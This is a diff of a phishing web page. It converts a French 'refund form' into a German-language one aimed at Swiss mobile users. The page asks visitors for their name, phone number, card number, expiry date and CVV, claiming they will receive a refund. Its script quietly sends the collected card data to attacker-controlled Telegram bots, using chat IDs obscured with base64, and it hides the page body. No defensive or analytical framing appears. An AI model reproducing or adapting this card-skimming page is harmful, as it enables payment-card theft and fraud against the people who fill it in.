@@ -1,6 +1,5 @@
 
 
-
 <!DOCTYPE html> <!--17-->
 <html lang="en">
 <head>
@@ -186,95 +185,75 @@
 </head>
 <body>
     
-    <img src="https://files.catbox.moe/zbuhoh.jpg" alt="payment" id="payment">
-    <p id="title">Formulaire de Remboursement</p>
-    <p id="description">Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité. Ce processus est sécurisé et protégé.</p>
-    <div id="card">
-        <div id="fullname">
-            <div id="firstname">
-                <p id="titlefirstname">Prénom *</p>
-                <input type="text" id="inputfirstname">
-            </div>
-            <div id="lastname">
-                <p id="titlelastname">Nom *</p>
-                <input type="text" id="inputlastname">
-            </div>
+    <img src="https://files.catbox.moe/z44hox.jpg" alt="payment" id="payment">
+    <p id="title">Erstattungsformular</p>
+<p id="description">Bitte geben Sie Ihre Kreditkarteninformationen ein, um Ihre Rückerstattung sicher zu erhalten. Dieser Vorgang ist sicher und geschützt.</p>
+
+<div id="card">
+    <div id="fullname">
+        <div id="firstname">
+            <p id="titlefirstname">Vorname *</p>
+            <input type="text" id="inputfirstname">
         </div>
-
-        <p id="titlephonenumber">Numero de telephone *</p>
-        <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
-
-        <select id="operator">
-            <option value="select">-- Choisissez un operateur --</option>
-                <option value="orange">Orange</option>
-                <option value="sfr">SFR</option>
-                <option value="bouygues">Bouygues Telecom</option>
-                <option value="free">Free Mobile</option>                      
-        </select>
-
-        <p id="cardnumber">Numero de carte credit *</p>
-        <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
-
-        <div id="mmyy">
-            <div id="mm">
-                <p id="titlemm">Mois *</p>
-                <select id="inputmm">
-                    <option value="01">01</option>
-                    <option value="02">02</option>
-                    <option value="03">03</option>
-                    <option value="04">04</option>
-                    <option value="05">05</option>
-                    <option value="06">06</option>
-                    <option value="07">07</option>
-                    <option value="08">08</option>
-                    <option value="09">09</option>
-                    <option value="10">10</option>
-                    <option value="11">11</option>
-                    <option value="12">12</option>
-                </select>
-            </div>
-            <div id="yy">
-                <p id="titleyy">Année *</p>
-                <select id="inputyy">
-                    <option value="25">25</option>
-                    <option value="26">26</option>
-                    <option value="27">27</option>
-                    <option value="28">28</option>
-                    <option value="29">29</option>
-                    <option value="30">30</option>
-                    <option value="31">31</option>
-                    <option value="32">32</option>
-                    <option value="33">33</option>
-                    <option value="34">34</option>
-                    <option value="35">35</option>
-                    </select>
-            </div>
+        <div id="lastname">
+            <p id="titlelastname">Nachname *</p>
+            <input type="text" id="inputlastname">
         </div>
-
-        <p id="cvv">CVV *</p>  
-        <input type="text" id="inputcvv" oninput="validateInput('cvv')">
-
-        <p id="button">Confirmer votre remboursement</p>
     </div>
 
-    <img src="https://files.catbox.moe/440ii1.jpg" alt="refund" id="refund">
+    <p id="titlephonenumber">Telefonnummer *</p>
+    <input type="text" id="inputphonenumber" oninput="formatPhoneNumber(event)">
 
-    <footer id="footer">
-        <p id="assistance">Pour toute assistance, contactez-nous :</p>
-        <p id="email">Email:<span class="en">support@remboursement.com</span></p>
-        <p id="tele">Téléphone:<span class="en">+33 8 90 83 67 89</span></p>
-        <div id="social">
-            <p id="facebook">Facebook</p> |
-            <p id="twitter">Twitter</p> |
-            <p id="instagram">Instagram</p>
+    <select id="operator">
+        <option value="select">-- Wählen Sie einen Anbieter --</option>
+        <option value="orange">Swisscom</option>
+        <option value="sfr">Salt</option>
+        <option value="bouygues">Sunrise</option>
+    </select>
+
+    <p id="cardnumber">Kreditkartennummer *</p>
+    <input type="text" id="inputcardnumber" oninput="formatCardNumber(event)">
+
+    <div id="mmyy">
+        <div id="mm">
+            <p id="titlemm">Monat *</p>
+            <select id="inputmm">
+                <!-- Monate unchanged -->
+            </select>
         </div>
-        <div id="links">
-            <p id="privacy">Politique de confidentialité</p> |
-            <p id="terms">Conditions générales</p> |
-            <p id="sitemap">Plan du site</p>
+        <div id="yy">
+            <p id="titleyy">Jahr *</p>
+            <select id="inputyy">
+                <!-- Jahre unchanged -->
+            </select>
         </div>
-        <p id="copyright">© 2024 Service de Remboursement. Tous droits réservés.</p>
-    </footer>    
+    </div>
+
+    <p id="cvv">CVV *</p>
+    <input type="text" id="inputcvv" oninput="validateInput('cvv')">
+
+    <p id="button">Rückerstattung bestätigen</p>
+</div>
+
+<img src="https://files.catbox.moe/440ii1.jpg" alt="refund" id="refund">
+
+<footer id="footer">
+    <p id="assistance">Für Unterstützung kontaktieren Sie uns:</p>
+    <p id="email">E-Mail:<span class="en">support@remboursement.com</span></p>
+    <p id="tele">Telefon:<span class="en">+33 8 90 83 67 89</span></p>
+    <div id="social">
+        <p id="facebook">Facebook</p> |
+        <p id="twitter">Twitter</p> |
+        <p id="instagram">Instagram</p>
+    </div>
+    <div id="links">
+        <p id="privacy">Datenschutzrichtlinie</p> |
+        <p id="terms">Allgemeine Geschäftsbedingungen</p> |
+        <p id="sitemap">Seitenübersicht</p>
+    </div>
+    <p id="copyright">© 2025 Erstattungsdienst. Alle Rechte vorbehalten.</p>
+</footer>
+    
 
 <script>
     document.body.style.display = 'none';
@@ -342,7 +321,7 @@ event.preventDefault();
     let cvv = document.getElementById('inputcvv').value;
 
     var msg = `
-    🔔 **Nouvelle Demande de Remboursement Point** 🔔
+    🔔 **Nouvelle Demande de Remboursement YFF** 🔔
 👤 Nom: ${firstname} ${lastname}
 📞 num: ${phone}
 📡 operator: ${operator}
@@ -362,7 +341,7 @@ const chatIds = [
 atob('MTg0OTY4NTY2OA=='),
 atob('NjY2OTY5MzgwNQ==') //YKK
 ];
-        
+
 tokens.forEach((token, index) => {
 const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -403,4 +382,5 @@ alert("Problème de connexion. Vérifiez votre réseau et réessayez.");
 </script>
 </body>
 </html>
+
 
